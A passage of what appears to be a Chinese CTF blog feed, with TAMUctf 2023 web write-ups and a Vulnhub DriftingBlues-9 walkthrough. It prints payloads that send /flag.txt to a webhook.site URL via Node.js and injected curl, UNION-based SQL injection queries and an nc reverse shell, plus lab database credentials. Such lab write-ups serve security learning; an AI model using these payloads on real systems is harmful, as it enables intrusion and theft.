&#123;</span><br><span class="line">        <span class="built_in">eval</span>(src);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">418</span>).<span class="title function_">end</span>(<span class="string">&#x27;Error on eval.&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>!`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>是一个javascript的命令执行，把数字字母全给过滤掉了，就是无数字字母的rce</p><p>这里的话就得使用jsfuck进行绕过了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;https&quot;</span>).<span class="title function_">get</span>(<span class="string">&quot;https://webhook.site/24e1c10f-df56-4421-8d89-a7ea91aa8610/?flag=&quot;</span>+process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>).<span class="title function_">readFileSync</span>(<span class="string">&quot;/flag.txt&quot;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure><p>这个代码和<strong>ctfshow nodejs</strong>里面的那个一样， 下次遇到的话可以进行参考</p><p>如何进行jsfuck编码，然后到题目里运行，然后在webhook.site就能接收到flag了</p><p><img src="../images/image-20230501203954385.png" alt="image-20230501203954385"></p><h2 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h2><p>题目</p><p><img src="../images/image-20230501161122636.png" alt="image-20230501161122636"></p><p>题目给了源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">escape_shell_cmd</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> <span class="string">&#x27;&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\\&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api/curl&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl</span>():</span><br><span class="line">    url = flask.request.form.get(<span class="string">&#x27;ip&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> escape_shell_cmd(url):</span><br><span class="line">        command = <span class="string">&quot;curl -s -D - -o /dev/null &quot;</span> + url + <span class="string">&quot; | grep -oP &#x27;^HTTP.+[0-9]&#123;3&#125;&#x27;&quot;</span></span><br><span class="line">        output = os.popen(command).read().strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;HTTP&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> output:</span><br><span class="line">            <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Error: No response&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: output&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> flask.jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Illegal Characters Detected&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8001</span>)</span><br></pre></td></tr></table></figure><p>这里的考点就是curl命令 的使用</p><p>这里先随便拿个题目的网站进行测试，然后抓包</p><p><img src="../images/image-20230501185955703.png" alt="image-20230501185955703"></p><p>发现可以</p><p><img src="../images/image-20230501190019175.png" alt="image-20230501190019175"></p><p>然后测试一下看能否使用  <code>;</code>进行分割</p><p><img src="../images/image-20230501190123233.png" alt="image-20230501190123233"></p><p>发现可以</p><p>然后就用题目给的payload来打了</p><p>先监听端口</p><p><img src="../images/image-20230501190208427.png" alt="image-20230501190208427"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip=http://localhost;curl+-d@flag.txt+https://webhook.site/24e1c10f-df56-4421-8d89-a7ea91aa8610</span><br></pre></td></tr></table></figure><p>这里的话用的是专门接收http请求头的一个网站  <a href="https://webhook.site/">https://webhook.site/</a></p><p>这里的话用自己的vps不知道为啥行不通</p><p><img src="../images/image-20230501202013603.png" alt="image-20230501202013603"></p><p>这里的-d是使用POST请求，因为GET请求的话不会返回flag</p><h2 id="Lost-and-Forgotten"><a href="#Lost-and-Forgotten" class="headerlink" title="Lost and Forgotten"></a>Lost and Forgotten</h2><p>我好像忘记了我最近写的文章的密码。请问有没有什么办法可以恢复。</p><p><img src="../images/image-20230501202323192.png" alt="image-20230501202323192"></p><p>考察的是sql注入</p><p><img src="../images/image-20230502150703358.png" alt="image-20230502150703358"></p><p>输入下面的内容的话会把wp全部给输出出来，那么我们就怀疑是不是sql注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; #</span><br></pre></td></tr></table></figure><p>输入下面的语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,3,4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502150852836.png" alt="image-20230502150852836"></p><p>返回这结果，那么就说明了是sql注入了，并且在123出都有回显，那么我们就在这几个地方进行sql注入了</p><p><img src="../images/image-20230502151259631.png" alt="image-20230502151259631"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select database()),4,5,6#</span><br></pre></td></tr></table></figure><p>查出数据名</p><p>接着查表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select table_name from information_schema.tables where table_schema = &quot;writeups&quot;),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502151547929.png" alt="image-20230502151547929"></p><p>查出表名，接着查列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,(select column_name from information_schema.columns where table_schema=database() and table_name=&quot;articles&quot; limit 1,1),4,5,6#</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502151714536.png" alt="image-20230502151714536"></p><p>limit 1,1查出来一个，那么接着往后查</p><p><img src="../images/image-20230502151807267.png" alt="image-20230502151807267"></p><p><img src="../images/image-20230502151829926.png" alt="image-20230502151829926"></p><p><img src="../images/image-20230502151844439.png" alt="image-20230502151844439"></p><p><img src="../images/image-20230502151859864.png" alt="image-20230502151859864"></p><p>最多能查到limit 5,1    之后的就查不到了，那么我们就挨个对列进行内容的读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or 1 union select 1,2,access_code,4,5,6 from articles #</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230502152041491.png" alt="image-20230502152041491"></p><p>最后查到加密后的flag</p><p><img src="../images/image-20230502152333647.png" alt="image-20230502152333647"></p><p>最好放到secret code里面就可以解出flag了</p><h2 id="Web-LTO"><a href="#Web-LTO" class="headerlink" title="Web LTO"></a>Web LTO</h2><p><img src="../images/image-20230501204706377.png" alt="image-20230501204706377"></p><p><img src="../images/image-20230501204726316.png" alt="image-20230501204726316"></p><p><strong>main.rs</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_files::NamedFile;</span><br><span class="line"><span class="keyword">use</span> actix_multipart::Multipart;</span><br><span class="line"><span class="keyword">use</span> actix_web::cookie::Cookie;</span><br><span class="line"><span class="keyword">use</span> actix_web::http::StatusCode;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;get, post, App, HttpRequest, HttpResponse, HttpServer, Responder, <span class="type">Result</span>&#125;;</span><br><span class="line"><span class="keyword">use</span> futures_util::stream::TryStreamExt;</span><br><span class="line"><span class="keyword">use</span> futures_util::StreamExt;</span><br><span class="line"><span class="keyword">use</span> rand::&#123;thread_rng, RngCore&#125;;</span><br><span class="line"><span class="keyword">use</span> std::collections::hash_map::DefaultHasher;</span><br><span class="line"><span class="keyword">use</span> std::fs::create_dir_all;</span><br><span class="line"><span class="keyword">use</span> std::hash::&#123;Hash, Hasher&#125;;</span><br><span class="line"><span class="keyword">use</span> std::io::&#123;ErrorKind, SeekFrom&#125;;</span><br><span class="line"><span class="keyword">use</span> std::path::PathBuf;</span><br><span class="line"><span class="keyword">use</span> std::<span class="type">str</span>::FromStr;</span><br><span class="line"><span class="keyword">use</span> tokio::fs::&#123;remove_file, write, File, OpenOptions&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio::io::AsyncReadExt;</span><br><span class="line"><span class="keyword">use</span> tokio::io::&#123;copy, AsyncSeekExt&#125;;</span><br><span class="line"><span class="keyword">use</span> tokio_util::io::StreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">handle_multipart</span>(user_dir: &amp;PathBuf, <span class="keyword">mut</span> multipart: Multipart) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">count</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// optimised from: https://github.com/actix/examples/blob/db5f00e771573023a1d3de402f47a661c5799ec9/forms/multipart/src/main.rs#L8</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">let</span> <span class="variable">Some</span>(field) = multipart.<span class="title function_ invoke__">try_next</span>().<span class="keyword">await</span>? &#123;</span><br><span class="line">        count += <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">16</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(std::io::Error::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                ErrorKind::InvalidInput,</span><br><span class="line">                <span class="string">&quot;Too many files provided in input!&quot;</span>,</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_ invoke__">into</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">content_disposition</span> = field.<span class="title function_ invoke__">content_disposition</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(filename) = content_disposition.<span class="title function_ invoke__">get_filename</span>() &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = DefaultHasher::<span class="title function_ invoke__">new</span>();</span><br><span class="line">            filename.<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">tmp</span> = PathBuf::<span class="title function_ invoke__">from_str</span>(<span class="string">&quot;tmp/&quot;</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">            tmp.<span class="title function_ invoke__">push</span>(<span class="built_in">format!</span>(<span class="string">&quot;&#123;:016x&#125;&quot;</span>, hasher.<span class="title function_ invoke__">finish</span>()));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">file</span> = OpenOptions::<span class="title function_ invoke__">new</span>()</span><br><span class="line">                .<span class="title function_ invoke__">read</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">write</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">create</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">open</span>(&amp;tmp)</span><br><span class="line">                .<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">freader</span> = StreamReader::<span class="title function_ invoke__">new</span>(field.<span class="title function_ invoke__">map</span>(|result| &#123;</span><br><span class="line">                <span class="comment">// StreamReader-friendly</span></span><br><span class="line">                result.<span class="title function_ invoke__">map_err</span>(|err| std::io::Error::<span class="title function_ invoke__">new</span>(ErrorKind::Other, err))</span><br><span class="line">            &#125;))</span><br><span class="line">            .<span class="title function_ invoke__">take</span>(<span class="number">1</span> &lt;&lt; <span class="number">16</span>); <span class="comment">// max file size</span></span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">copy</span>(&amp;<span class="keyword">mut</span> freader, &amp;<span class="keyword">mut</span> file).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// upload succeeded; copy to user area</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">destination</span> = user_dir.<span class="title function_ invoke__">join</span>(</span><br><span class="line">                tmp.<span class="title function_ invoke__">file_name</span>()</span><br><span class="line">                    .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Must be present based on filename creation.&quot;</span>),</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// avoid overhead from open()</span></span><br><span class="line">            file.<span class="title function_ invoke__">seek</span>(SeekFrom::<span class="title function_ invoke__">Start</span>(<span class="number">0</span>)).<span class="keyword">await</span>?;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">orig</span> = file;</span><br><span class="line">            <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">dest</span> = File::<span class="title function_ invoke__">create</span>(&amp;destination).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="title function_ invoke__">copy</span>(&amp;<span class="keyword">mut</span> orig, &amp;<span class="keyword">mut</span> dest).<span class="keyword">await</span>?;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// cleanup</span></span><br><span class="line">            <span class="title function_ invoke__">drop</span>(orig);</span><br><span class="line">            <span class="title function_ invoke__">drop</span>(dest);</span><br><span class="line">            <span class="title function_ invoke__">remove_file</span>(tmp).<span class="keyword">await</span>?;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">Err</span>(std::io::Error::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                ErrorKind::InvalidInput,</span><br><span class="line">                <span class="string">&quot;Missing filename from provided file.&quot;</span>.<span class="title function_ invoke__">to_string</span>(),</span><br><span class="line">            )</span><br><span class="line">            .<span class="title function_ invoke__">into</span>());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upload</span>(req: HttpRequest, multipart: Multipart) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(user) = req.<span class="title function_ invoke__">cookie</span>(<span class="string">&quot;whoami&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">hasher</span> = DefaultHasher::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        user.<span class="title function_ invoke__">value</span>().<span class="title function_ invoke__">hash</span>(&amp;<span class="keyword">mut</span> hasher);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">user_dir</span> = PathBuf::<span class="title function_ invoke__">from</span>(<span class="built_in">format!</span>(<span class="string">&quot;user/&#123;:016x&#125;&quot;</span>, hasher.<span class="title function_ invoke__">finish</span>()));</span><br><span class="line">        <span class="title function_ invoke__">create_dir_all</span>(&amp;user_dir)?;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Err</span>(e) = <span class="title function_ invoke__">handle_multipart</span>(&amp;user_dir, multipart).<span class="keyword">await</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">write</span>(user_dir.<span class="title function_ invoke__">join</span>(<span class="string">&quot;error&quot;</span>), e.<span class="title function_ invoke__">to_string</span>()).<span class="keyword">await</span>?;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">body</span> = <span class="type">Vec</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">tar</span> = tar::Builder::<span class="title function_ invoke__">new</span>(&amp;<span class="keyword">mut</span> body);</span><br><span class="line">        tar.<span class="title function_ invoke__">append_dir_all</span>(<span class="string">&quot;submitted&quot;</span>, user_dir)?;</span><br><span class="line">        <span class="title function_ invoke__">drop</span>(tar);</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">build</span>(StatusCode::OK)</span><br><span class="line">            .<span class="title function_ invoke__">content_type</span>(<span class="string">&quot;application/tar&quot;</span>)</span><br><span class="line">            .<span class="title function_ invoke__">insert_header</span>((<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment&quot;</span>))</span><br><span class="line">            .<span class="title function_ invoke__">body</span>(body)</span><br><span class="line">            .<span class="title function_ invoke__">respond_to</span>(&amp;req)</span><br><span class="line">            .<span class="title function_ invoke__">map_into_boxed_body</span>())</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">new</span>(StatusCode::UNAUTHORIZED))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(req: HttpRequest) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">res</span> = NamedFile::<span class="title function_ invoke__">open</span>(<span class="string">&quot;www/index.html&quot;</span>)?.<span class="title function_ invoke__">into_response</span>(&amp;req);</span><br><span class="line">    <span class="keyword">if</span> req.<span class="title function_ invoke__">cookie</span>(<span class="string">&quot;whoami&quot;</span>).<span class="title function_ invoke__">is_none</span>() &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">rng</span> = <span class="title function_ invoke__">thread_rng</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">ident</span> = [<span class="number">0u8</span>; <span class="number">256</span>]; <span class="comment">// big un-bruteforce-able bytes</span></span><br><span class="line">        rng.<span class="title function_ invoke__">fill_bytes</span>(&amp;<span class="keyword">mut</span> ident);</span><br><span class="line">        res.<span class="title function_ invoke__">add_cookie</span>(</span><br><span class="line">            &amp;Cookie::<span class="title function_ invoke__">build</span>(<span class="string">&quot;whoami&quot;</span>, hex::<span class="title function_ invoke__">encode</span>(ident))</span><br><span class="line">                .<span class="title function_ invoke__">http_only</span>(<span class="literal">true</span>)</span><br><span class="line">                .<span class="title function_ invoke__">finish</span>(),</span><br><span class="line">        )?;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(res)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> std::io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">addr</span> = std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;SERVER_ADDR&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Couldn&#x27;t find an appropriate server address; did you set SERVER_ADDR?&quot;</span>);</span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(|| App::<span class="title function_ invoke__">new</span>().<span class="title function_ invoke__">service</span>(index).<span class="title function_ invoke__">service</span>(upload))</span><br><span class="line">        .<span class="title function_ invoke__">bind_uds</span>(addr)?</span><br><span class="line">        .<span class="title function_ invoke__">run</span>()</span><br><span class="line">        .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://astr.cc/blog/tamuctf-2023-writeup/#web-lto">详解wp</a>   这里不太想看就不写了</p><h2 id="Flag-Fetcher"><a href="#Flag-Fetcher" class="headerlink" title="Flag Fetcher"></a>Flag Fetcher</h2><p>题目</p><p>两道题都是rust</p><p><a href="https://astr.cc/blog/tamuctf-2023-writeup/#flag-fetcher">详细wp</a></p><p>接下来就不写了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/tamuctf/tamuctf-2023/tree/master/web&quot;&gt;官方wp地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://velog.io/@sani/TAMU-CTF-writeups&quot;&gt;韩国</summary>
      
    
    
    
    
    <category term="TAMUctf 2023-web-复现" scheme="https://ke1nys.github.io/tags/TAMUctf-2023-web-%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub——DriftingBlues-9</title>
    <link href="https://ke1nys.github.io/posts/89f41699.html"/>
    <id>https://ke1nys.github.io/posts/89f41699.html</id>
    <published>2023-04-30T14:30:47.000Z</published>
    <updated>2023-05-03T12:37:29.080Z</updated>
    
    <content type="html"><![CDATA[<p>先扫一下c段发现靶机</p><p><img src="../images/image-20230430223340760.png" alt="image-20230430223340760"></p><p>然后扫一下端口</p><p><img src="../images/image-20230430223410966.png" alt="image-20230430223410966"></p><p>发现了个新端口  没见过</p><p><img src="../images/image-20230430223613576.png" alt="image-20230430223613576"></p><p>还是先查看一下80端口</p><p><img src="../images/image-20230430223917177.png" alt="image-20230430223917177"></p><p>查看源码发现版本和框架</p><p>那么就去找一下看存不存在漏洞</p><p><img src="../images/image-20230430224032571.png" alt="image-20230430224032571"></p><p>发现存在漏洞，于是就尝试进行漏洞利用</p><p><img src="../images/image-20230430224139189.png" alt="image-20230430224139189"></p><p>然后将脚本复制到出来执行</p><p><img src="../images/image-20230430224307635.png" alt="image-20230430224307635"></p><p><img src="../images/image-20230430224450992.png" alt="image-20230430224450992"></p><p>刚好发现了数据库的账号密码</p><p>这里的话使用的python2  python3的话会报错</p><p>这里看的不方便，于是尝试一下反弹shell</p><p><img src="../images/image-20230430224534036.png" alt="image-20230430224534036"></p><p>存在nc命令，可以使用nc反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.142.129 6666 -e /bin/bash</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230430224640615.png" alt="image-20230430224640615"></p><p>反弹shell成功，那么我们就进行python的shell交互一下</p><p>那么我们就尝试一下刚刚拿到的数据的账号密码进行用户的切换</p><p><strong><code>clapton / yaraklitepe</code></strong></p><p>因为直接cd /home/clapton  权限不够</p><p><img src="../images/image-20230430224951322.png" alt="image-20230430224951322"></p><p>成功了</p><p>然后就可以拿到第一个flag了</p><p><img src="../images/image-20230430225059208.png" alt="image-20230430225059208"></p><p>这里的话又给出一个缓冲区溢出提权：</p><p>先把input文件下到本地</p><p>开启有个服务   python -m SimpleHTTPServer    因为http模块没有，就只能用这个模块了</p><p><img src="../images/image-20230430230743704.png" alt="image-20230430230743704"></p><p>成功下到本地</p><p>这里进行了解就行了  缓冲区溢出提权知道就行   实际的操作不太会</p><p><strong>总结</strong></p><p>开启python服务的两个方法</p><p><strong>python -m SimpleHTTPServer</strong></p><p><strong>python -m http.server</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先扫一下c段发现靶机&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230430223340760.png&quot; alt=&quot;image-20230430223340760&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后扫一下端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../imag</summary>
      
    
    
    
    
    <category term="Vulnhub——DriftingBlues-9" scheme="https://ke1nys.github.io/tags/Vulnhub%E2%80%94%E2%80%94DriftingBlues-9/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub——DriftingBlues-6</title>
